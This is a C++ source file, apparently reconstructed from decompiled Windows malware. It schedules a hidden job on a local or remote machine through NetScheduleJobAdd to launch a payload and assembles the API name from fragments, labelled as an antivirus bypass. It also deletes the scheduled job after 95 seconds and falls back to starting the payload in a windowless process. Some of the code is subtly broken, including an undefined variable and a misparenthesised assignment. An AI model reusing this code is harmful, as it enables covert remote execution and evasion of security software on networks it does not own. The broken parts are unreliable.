/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "2.h"
#include "0.h"

typedef NET_API_STATUS (__stdcall *NetSchdJobAdd_t)(LPCWSTR, LPBYTE, LPDWORD);

bool AddNewJob(const WCHAR *UncServerName, WCHAR *svc_path)
{
	bool retVal = false; // [sp+Fh] [bp-2Dh]@1
	int v19; // [sp+38h] [bp-4h]@4

	PTIME_OF_DAY_INFO time_of_day = NULL;
	if(!NetRemoteTOD(UncServerName, (LPBYTE *)&time_of_day))
	{
		AT_INFO *job_info = NULL;
		if(!NetApiBufferAllocate(sizeof(AT_INFO), (LPVOID *)&job_info))
		{
			if(job_info)
			{
				
				job_info->Command     = svc_path;
				job_info->JobTime     = 1000 * (60 * (time_of_day->tod_mins + 60 * time_of_day->tod_hours - time_of_day->tod_timezone) + time_of_day->tod_secs + 90);
				job_info->Flags       = JOB_NONINTERACTIVE;
				job_info->DaysOfMonth = 0;
				job_info->DaysOfWeek  = 0;
				
				/** ----->> AV bypass "NetScheduleJobAdd" <<----- */
				std::basic_string<char> str_procname = "JobAdd";
				v19 = 0; // This must be some AV shit
				str_procname.insert(0, "Schedule");
				str_procname.insert(0, "Net");
				
				NetSchdJobAdd_t _NetScheduleJobAdd = GetProcAddress(GetModuleHandleW(L"netapi32.dll"), str_procname.c_str());
				
				DWORD jobID = NULL;

				if(_NetScheduleJobAdd && !_NetScheduleJobAdd(UncServerName, (LPBYTE)job_info, &jobID))
				{
					JOB_PROPERTIES *job = (JOB_PROPERTIES *)VirtualAlloc(NULL, 48, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
					if(job)
					{
						job->JobId = v10;
						if(UncServerName)
						{
							strcpyW(job->ServerName, UncServerName, 2 * strlenW(UncServerName) + 2);
							job->IsServerNameSet = 1;
						}
						else
						{
							job->IsServerNameSet = 0;
						}
						CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DeleteJobAfter95Seconds, job, 0, 0);
					}
					retVal = 1;
				}
				else
				{
					retVal = 0;
				}
				
				if(job_info)
					NetApiBufferFree(job_info);
			}
		}
	}
	
	if(time_of_day)
		NetApiBufferFree(time_of_day);
	
	return retVal;
}

bool StartServiceProcess(WCHAR *svc_name, const WCHAR *svc_path, DWORD *service_id)
{
	if(!svc_name || !svc_path || !service_id) return 0;
	
	WCHAR *svc_path_cpy = (WCHAR *)VirtualAlloc(NULL, 2 * strlenW(svc_path) + 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(svc_path_cpy)
	{
		memmove(svc_path_cpy, svc_path, 2 * strlenW(svc_path) + 2);
		*service_id = 0;
		
		if(!AddNewJob(0, svc_path_cpy) || (Sleep(95000), *service_id = SearchProcessByIdOrName(0, svc_name) == 0))
		{
			struct _PROCESS_INFORMATION ProcessInformation;
			memset(&ProcessInformation, 0, 16);

			struct _STARTUPINFOW StartupInfo; // [sp+Ch] [bp-5Ch]@7
			memset(&StartupInfo, 0, 68);
			
			
			if(!CreateProcessW(NULL, svc_path_cpy, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &ProcessInformation))
			{
				VirtualFree(svc_path_cpy, 0, MEM_RELEASE);
				return false;
			}
			
			*service_id = ProcessInformation.dwProcessId;
			
			CloseHandle(ProcessInformation.hThread);
			CloseHandle(ProcessInformation.hProcess);
			CloseHandle(StartupInfo.hStdError);
			CloseHandle(StartupInfo.hStdInput);
			CloseHandle(StartupInfo.hStdOutput);
		}
		
		return true;
	}

	return false;;
}